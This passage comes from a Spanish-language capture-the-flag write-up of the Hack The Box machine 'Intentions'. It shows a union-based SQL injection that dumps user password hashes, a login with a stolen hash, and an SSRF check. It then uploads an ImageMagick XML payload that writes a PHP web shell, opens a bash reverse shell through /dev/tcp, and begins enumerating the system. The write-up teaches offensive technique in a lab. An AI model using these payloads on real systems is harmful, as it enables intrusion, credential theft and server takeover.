+function&gt; payload=<span class="code-dark-magenta">$(</span><span class="code-dark-green">sed</span> <span class="code-dark-yellow">'s% %/**/%g'</span> &lt;&lt;&lt; $1<span class="code-dark-magenta">)</span>
+function&gt; <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/gallery/user/genres -d <span class="code-dark-yellow">"{<span class="code-dark-cyan">\"</span>genres<span class="code-dark-cyan">\"</span>:<span class="code-dark-cyan">\"$payload\"</span>}"</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -H <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span> &amp;&gt;<span class="mtku">/dev/null</span>
+function&gt; <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/gallery/user/feed -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span>
+function&gt; <span class="code-dark-yellow">}</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"') or ('1'='1"</span>
+{"status":"success","data":[{"id":1,"file":"public\/animals\/ashlee-w-wv36v9TGNBw-unsplash.jpg","genre":"animals","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/animals\/ashlee-w-wv36v9TGNBw-unsplash.jpg"},{"id":2,"file":"public\/animals\/dickens-lin-Nr7QqJIP8Do-unsplash.jpg","genre":"animals","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/animals\/dickens-lin-Nr7QqJIP8Do-unsplash.jpg"},{"id":3,"file":"public\/animals\/dickens-lin-tycqN7-MY1s-unsplash.jpg","genre":"animals","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/animals\/dickens-lin-tycqN7-MY1s-unsplash.jpg"},{"id":4,"file":"public\/animals\/jevgeni-fil-rz2Nh0U8vws-unsplash.jpg","genre":"animals","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/animals\/jevgeni-fil-rz2Nh0U8vws-unsplash.jpg"},{"id":5,"file":"public\/animals\/kristin-o-karlsen-u8aXoDEcDR0-unsplash.jpg","genre":"animals","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/animals\/kristin-o-karlsen-u8aXoDEcDR0-unsplash.jpg"},{"id":6,"file":"public\/architecture\/axp-photography-EU1sTG7DGxE-unsplash.jpg","genre":"architecture","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/architecture\/axp-photography-EU1sTG7DGxE-unsplash.jpg"},{"id":7,"file":"public\/architecture\/k-t-francis-kHm0iLOj2zg-unsplash.jpg","genre":"architecture","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/architecture\/k-t-francis-kHm0iLOj2zg-unsplash.jpg"},{"id":8,"file":"public\/architecture\/leopold-baskarad-BcIr38tPxJ8-unsplash.jpg","genre":"architecture","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/architecture\/leopold-baskarad-BcIr38tPxJ8-unsplash.jpg"},{"id":9,"file":"public\/architecture\/nico-baum-LudJh7dPfv4-unsplash.jpg","genre":"architecture","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/architecture\/nico-baum-LudJh7dPfv4-unsplash.jpg"},{"id":10,"file":"public\/food\/anto-meneghini-sJ4ix9_AjAc-unsplash.jpg","genre":"food","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/food\/anto-meneghini-sJ4ix9_AjAc-unsplash.jpg"},{"id":11,"file":"public\/food\/dan-9-f4enU0AY0-unsplash.jpg","genre":"food","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/food\/dan-9-f4enU0AY0-unsplash.jpg"},{"id":12,"file":"public\/food\/fatemeh-rz--RqVu65QrTM-unsplash.jpg","genre":"food","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/food\/fatemeh-rz--RqVu65QrTM-unsplash.jpg"},{"id":13,"file":"public\/food\/jonathan-borba-BMpBW2476wQ-unsplash.jpg","genre":"food","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/food\/jonathan-borba-BMpBW2476wQ-unsplash.jpg"},{"id":14,"file":"public\/food\/rod-long--LMw-y4gxac-unsplash.jpg","genre":"food","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/food\/rod-long--LMw-y4gxac-unsplash.jpg"},{"id":15,"file":"public\/nature\/edoardo-botez-rm8q_Gy2iJs-unsplash.jpg","genre":"nature","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/nature\/edoardo-botez-rm8q_Gy2iJs-unsplash.jpg"},{"id":16,"file":"public\/nature\/laura-adai-mxGR7FogG10-unsplash.jpg","genre":"nature","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/nature\/laura-adai-mxGR7FogG10-unsplash.jpg"},{"id":17,"file":"public\/nature\/marek-piwnicki-urmnC74otpA-unsplash.jpg","genre":"nature","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/nature\/marek-piwnicki-urmnC74otpA-unsplash.jpg"},{"id":18,"file":"public\/nature\/marek-piwnicki-VOv4uaMf9E4-unsplash.jpg","genre":"nature","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/nature\/marek-piwnicki-VOv4uaMf9E4-unsplash.jpg"},{"id":19,"file":"public\/nature\/rafael-garcin-GsQ0iSb88HY-unsplash.jpg","genre":"nature","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/nature\/rafael-garcin-GsQ0iSb88HY-unsplash.jpg"}]}  
+</code></pre></div><p>Usemos consultas <code>UNION</code> para enumerar la base de datos (<code>union 1</code>, <code>union 1,2</code>, &mldr; hasta que no haya errores). Al final, descubrimos que la tabla tiene 5 columnas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"') union select 1,2,3,4,5 or ('1'='1"</span>
+{"status":"success","data":[{"id":1,"file":"2","genre":"3","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:01.000000Z","url":"\/storage\/2"}]}  
+</code></pre></div><p>Usemos <code>jq</code> y el campo <code>file</code> para exfiltrar la información:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"') union select 1,1337,3,4,5 or ('1'='1"</span> | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"status"</span><span class="code-white">: </span><span class="code-dark-green">"success"</span><span class="code-white">,</span>
+  <span class="code-blue">"data"</span><span class="code-white">: </span>[</span>
+<span class="code-white">    {</span>
+      <span class="code-blue">"id"</span><span class="code-white">: </span></span>1<span class="code-white">,</span>
+      <span class="code-blue">"file"</span><span class="code-white">: </span><span class="code-dark-green">"1337"</span><span class="code-white">,</span>
+      <span class="code-blue">"genre"</span><span class="code-white">: </span><span class="code-dark-green">"3"</span><span class="code-white">,</span>
+      <span class="code-blue">"created_at"</span><span class="code-white">: </span><span class="code-dark-green">"1970-01-01T00:00:04.000000Z"</span><span class="code-white">,</span>
+      <span class="code-blue">"updated_at"</span><span class="code-white">: </span><span class="code-dark-green">"1970-01-01T00:00:01.000000Z"</span><span class="code-white">,</span>
+      <span class="code-blue">"url"</span><span class="code-white">: </span><span class="code-dark-green">"/storage/2"</span>
+<span class="code-white">    }</span>
+<span class="code-white">  ]</span>
+<span class="code-white">}</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"') union select 1,1337,3,4,5 or ('1'='1"</span> | <span class="code-dark-green">jq</span> -r <span class="code-dark-yellow">'.data[0].file'</span>  
+1337
+</code></pre></div><p>Comencemos con la información básica de la base de datos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"') union select 1,version(),3,4,5 or ('1'='1"</span> | <span class="code-dark-green">jq</span> -r <span class="code-dark-yellow">'.data[0].file'</span>
+10.6.12-MariaDB-0ubuntu0.22.04.1
+
+<span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"') union select 1,user(),3,4,5 or ('1'='1"</span> | <span class="code-dark-green">jq</span> -r <span class="code-dark-yellow">'.data[0].file'</span>
+laravel@localhost
+
+<span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"') union select 1,database(),3,4,5 or ('1'='1"</span> | <span class="code-dark-green">jq</span> -r <span class="code-dark-yellow">'.data[0].file'</span>  
+intentions
+</code></pre></div><p>El usuario llamado <code>laravel</code> parece prometedor&mldr; tal vez la aplicación <em>back-end</em> está construida con Laravel (un <em>framework</em> de PHP).</p><p>Por el momento, vamos a volcar la base de datos. Estas son las tablas disponibles:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"') union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='intentions'),3,4,5 or ('1'='1"</span> | <span class="code-dark-green">jq</span> -r <span class="code-dark-yellow">'.data[0].file'</span>  
+gallery_images,personal_access_tokens,migrations,users
+</code></pre></div><p>Veamos qué hay en la tabla de `users``:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"') union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='intentions'),3,4,5 or ('1'='1"</span> | <span class="code-dark-green">jq</span> -r <span class="code-dark-yellow">'.data[0].file'</span>  
+id,name,email,password,created_at,updated_at,admin,genres
+</code></pre></div><p>Muy bien, vamos a volcar esta tabla:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"') union select 1,(select group_concat(concat(admin,0x20,email,0x20,password,0x0a)) from users),3,4,5 or ('1'='1"</span> | <span class="code-dark-green">jq</span> -r <span class="code-dark-yellow">'.data[0].file'</span>  
+1 steve@intentions.htb $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
+,1 greg@intentions.htb $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m
+,0 hettie.rutherford@example.org $2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6
+,0 nader.alva@example.org $2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2
+,0 jones.laury@example.com $2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae
+,0 wanda93@example.org $2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW
+,0 mwisoky@example.org $2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7.
+,0 lura.zieme@example.org $2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2
+,0 pouros.marcus@example.net $2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO
+,0 mellie.okon@example.com $2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m
+,0 trace94@example.net $2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W
+,0 kayleigh18@example.com $2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi
+,0 tdach@example.com $2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2.
+,0 lindsey.muller@example.org $2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS
+,0 tschmidt@example.org $2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm
+,0 murray.marilie@example.com $2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S
+,0 barbara.goodwin@example.com $2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2
+,0 maggio.lonny@example.org $2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya
+,0 chackett@example.org $2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW
+,0 layla.swift@example.net $2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei
+,0 rshanahan@example.net $2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2
+,0 shyatt@example.com $2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy
+,0 sierra.russel@example.com $2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma
+,0 ferry.erling@example.com $2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa
+,0 beryl68@example.org $2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa
+,0 ellie.moore@example.net $2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy
+,0 littel.blair@example.org $2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou
+,0 asdf@asdf.com $2y$10$7dKQJxrAGL8.rQXGtAs3NuNavuICIlaSKD9VMm3n.3GdPoTKFJ.Ba
+,0 fdsa@asdf.com $2y$10$hIADcactVwH6Kg7Mb4fIfeXvExAeKkwc3T04yEnKgSELdfy.WgOmW
+</code></pre></div><p>Genial, tenemos muchos usuarios y <em>hashes</em> de contraseñas. Podemos tratar de romper los <em>hashes</em>, pero son <em>hashes</em> de Bcrypt, que son muy difíciles de romper en términos de potencia computacional.</p><h3 id="_pass-the-hash_"><em>Pass the Hash</em></h3><p>De hecho, recordemos que el inicio de sesión de <code>v2</code> requiere un campo <code>hash</code> y no una contraseña en texto claro&mldr; Vamos a verlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v2/auth/login -id <span class="code-dark-yellow">'{"email":"steve@intentions.htb","hash":"$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>
+HTTP/1.1 200 OK
+<span class="code-white">Server</span>: nginx/1.18.0 (Ubuntu)
+<span class="code-white">Content-Type</span>: application/json
+<span class="code-white">Transfer-Encoding</span>: chunked
+<span class="code-white">Connection</span>: keep-alive
+<span class="code-white">Cache-Control</span>: no-cache, private
+<span class="code-white">Date</span>:
+<span class="code-white">Authorization</span>: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNjg4NjAxNjQxLCJleHAiOjE2ODg2MjMyNDEsIm5iZiI6MTY4ODYwMTY0MSwianRpIjoicnpXTTRLSjg4WXVqaHk4cyIsInN1YiI6IjEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.jN8_e263_pWhVUWrDDM1htQNtG7MoPYgE2ec5jG9n84
+<span class="code-white">X-RateLimit-Limit</span>: 3600
+<span class="code-white">X-RateLimit-Remaining</span>: 3597
+<span class="code-white">Access-Control-Allow-Origin</span>: *
+<span class="code-white">Set-Cookie</span>: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNjg4NjAxNjQxLCJleHAiOjE2ODg2MjMyNDEsIm5iZiI6MTY4ODYwMTY0MSwianRpIjoicnpXTTRLSjg4WXVqaHk4cyIsInN1YiI6IjEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.jN8_e263_pWhVUWrDDM1htQNtG7MoPYgE2ec5jG9n84; expires=Thu, 06-Jul-2023 06:00:41 GMT; Max-Age=21600; path=/; httponly; samesite=lax  
+<span class="code-white">X-Frame-Options</span>: SAMEORIGIN
+<span class="code-white">X-XSS-Protection</span>: 1; mode=block
+<span class="code-white">X-Content-Type-Options</span>: nosniff
+
+{"status":"success","name":"steve"}
+</code></pre></div><p>Con esto, tenemos una <em>cookie</em> de sesión válida para <code>steve</code> (el <em>token</em> JWT), que tiene el campo <code>admin</code> en <code>1</code>. Si agregamos la <em>cookie</em> al navegador, entraremos en el perfil de <code>steve</code>:</p><p><img src="/images/HTB/Intentions/Intentions-14.webp" alt="Intentions 14"></p><p>Después de una suposición rápida, podemos intentar acceder a <code>/admin</code> y se nos redirige a esta página:</p><p><img src="/images/HTB/Intentions/Intentions-15.webp" alt="Intentions 15"></p><p>Hay una nota sobre por qué el desarrollador de API <code>v2</code> pensó que autenticarse con un <em>hash</em> en lugar de una contraseña era una buena idea. De todos modos, como <code>admin</code> tenemos acceso a la lista de todos los usuarios y todas las imágenes cargadas:</p><p><img src="/images/HTB/Intentions/Intentions-16.webp" alt="Intentions 16"></p><p><img src="/images/HTB/Intentions/Intentions-17.webp" alt="Intentions 17"></p><p>Tenemos la oportunidad de jugar con las imágenes:</p><p><img src="/images/HTB/Intentions/Intentions-18.webp" alt="Intentions 18"></p><p><img src="/images/HTB/Intentions/Intentions-19.webp" alt="Intentions 19"></p><p>Si usamos Burp Suite, veremos estas peticiones y respuestas:</p><p><img src="/images/HTB/Intentions/Intentions-20.webp" alt="Intentions 20"></p><p>Podemos intentar ver si el servidor lee archivos arbitrarios como <code>/etc/passwd</code>:</p><p><img src="/images/HTB/Intentions/Intentions-21.webp" alt="Intentions 21"></p><p>Pero también podemos probar si el servidor puede obtener archivos remotos:</p><p><img src="/images/HTB/Intentions/Intentions-22.webp" alt="Intentions 22"></p><p>Y lo es!</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 80
+Ncat: Version 7.94 ( https://nmap.org/ncat )  
+Ncat: Listening on [::]:80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.11.220:46004.
+GET /asdf HTTP/1.1
+Host: 10.10.14.242
+Connection: close
+
+^C
+</code></pre></div><h3 id="ejecución-remota-de-comandos">Ejecución remota de comandos</h3><p>Podemos intentar cargar un archivo PHP en el servidor, pero parece que el archivo no se guarda si no es un archivo de imagen.</p><p>Después de un poco de investigación, descubrimos que si <a href="https://imagemagick.org/">ImageMagick</a> se usa por detrás, podríamos escribir archivos arbitrarios en la máquina. Esto puede llevar a escribir código PHP y luego decirle al servidor que lo ejecute para obtener RCE. El <em>exploit</em> previsto se puede encontrar en <a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">swarm.ptsecurity.com</a>. Este implica cargar el siguiente documento XML:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">&lt;?</span><span class="mtk5">xml</span><span class="mtk8"> version</span><span class="mtk1">=</span><span class="mtk4">"1.0"</span><span class="mtk8"> encoding</span><span class="mtk1">=</span><span class="mtk4">"UTF-8"</span><span class="mtk1">?&gt;</span>
+<span class="mtk1">&lt;</span><span class="mtk5">image</span><span class="mtk1">&gt;</span>
+<span class="mtk1">  &lt;</span><span class="mtk5">read</span><span class="mtk1"> </span><span class="mtk8">filename</span><span class="mtk1">=</span><span class="mtk4">"caption:</span><span class="mtk6">&amp;lt;</span><span class="mtk4">?php system($_GET['c']); ?</span><span class="mtk6">&amp;gt;</span><span class="mtk4">"</span><span class="mtk1"> /&gt;</span>  
+<span class="mtk1">  &lt;</span><span class="mtk5">write</span><span class="mtk1"> </span><span class="mtk8">filename</span><span class="mtk1">=</span><span class="mtk4">"info:/var/www/html/intentions/storage/shell.php"</span><span class="mtk1"> /&gt;</span>
+<span class="mtk1">&lt;/</span><span class="mtk5">image</span><span class="mtk1">&gt;</span>
+</code></pre></div><p>Como se puede ver, estamos tratando de escribir <code>&lt;?php system($_GET['c']); ?></code> en un archivo PHP en una carpeta pública del servidor para obtener RCE. Este es un esquema VID, que indica a <a href="https://imagemagick.org/">ImageMagick</a> que procese otros archivos y realice las acciones especificadas en el documento XML.</p><p>Una petición/respuesta exitosa se puede ver a continuación:</p><p><img src="/images/HTB/Intentions/Intentions-23.webp" alt="Intentions 23"></p><p>Y con esto conseguimos RCE:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.220/storage/shell.php?c=whoami'</span>
+caption:www-data
+ CAPTION 120x120 120x120+0+0 16-bit sRGB 4.480u 0:05.425  
+</code></pre></div><p>Consigamos una <em>reverse shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.220/storage/shell.php?c=echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx+|+base64+-d+|+bash'</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.94 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.220:44940.
+bash: cannot set terminal process group (1070): Inappropriate ioctl for device  
+bash: no job control in this shell
+www-data@intentions:~/html/intentions/storage/app/public$ cd
+cd
+www-data@intentions:~$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+www-data@intentions:~$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+www-data@intentions:~$ export TERM=xterm
+www-data@intentions:~$ export SHELL=bash
+www-data@intentions:~$ stty rows 50 columns 158
+</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Como <code>www-data</code> no hay mucho que hacer. Podemos ver que hay más usuarios de bajos privilegios:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@intentions:~$ ls /home  
+greg  legal  steven
+</code></pre></div><p>Además, podemos ver que hay un directorio llamado <code>scanner</code> en <code>/opt</code> que pertenece al grupo <code>scanner</code>. Los usuarios <code>legal</code> y <code>greg</code> pertenecen a este grupo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@intentions:~$ ls -la /opt
+total 12
+drwxr-xr-x  3 root root    4096 Jun 10 15:14 .
+drwxr-xr-x 18 root root    4096 Jun 19 13:34 ..
+drwxr-x---  2 root scanner 4096 Jun 19 11:26 scanner  
+www-data@intentions:~$ grep scanner /etc/group
+scanner:x:1003:greg,legal
+</code></pre></div><p>En este punto, debemos echar un vistazo al código fuente del servidor web:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@intentions:~$ pwd
+/var/www
+www-data@intentions:~$ ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Feb  1 14:52 .
+drwxr-xr-x 13 root root 4096 Jun 16 11:11 ..
+drwxr-xr-x  3 root root 4096 Feb  2 17:55 html
+www-data@intentions:~$ ls -la html/
+total 12
+drwxr-xr-x  3 root root 4096 Feb  2 17:55 .
+drwxr-xr-x  3 root root 4096 Feb  1 14:52 ..
+drwxr-xr-x 14 root root 4096 Feb  2 17:55 intentions
+www-data@intentions:~$ ls -la html/intentions/
+total 820
+drwxr-xr-x  14 root     root       4096 Feb  2 17:55 .
+drwxr-xr-x   3 root     root       4096 Feb  2 17:55 ..
+-rw-r--r--   1 root     root       1068 Feb  2 17:38 .env
+drwxr-xr-x   8 root     root       4096 Feb  3 00:51 .git
+-rw-r--r--   1 root     root       3958 Apr 12  2022 README.md
+drwxr-xr-x   7 root     root       4096 Apr 12  2022 app
+-rwxr-xr-x   1 root     root       1686 Apr 12  2022 artisan
+drwxr-xr-x   3 root     root       4096 Apr 12  2022 bootstrap
+-rw-r--r--   1 root     root       1815 Jan 29 19:58 composer.json
+-rw-r--r--   1 root     root     300400 Jan 29 19:58 composer.lock
+drwxr-xr-x   2 root     root       4096 Jan 29 19:26 config
+drwxr-xr-x   5 root     root       4096 Apr 12  2022 database
+-rw-r--r--   1 root     root       1629 Jan 29 20:17 docker-compose.yml  
+drwxr-xr-x 534 root     root      20480 Jan 30 23:38 node_modules
+-rw-r--r--   1 root     root     420902 Jan 30 23:38 package-lock.json
+-rw-r--r--   1 root     root        891 Jan 30 23:38 package.json
+-rw-r--r--   1 root     root       1139 Jan 29 19:15 phpunit.xml
+drwxr-xr-x   5 www-data www-data   4096 Jul  5 20:40 public
+drwxr-xr-x   7 root     root       4096 Jan 29 19:58 resources
+drwxr-xr-x   2 root     root       4096 Jun 19 11:22 routes
+-rw-r--r--   1 root     root        569 Apr 12  2022 server.php
+drwxr-xr-x   5 www-data www-data   4096 Jul  5 12:43 storage
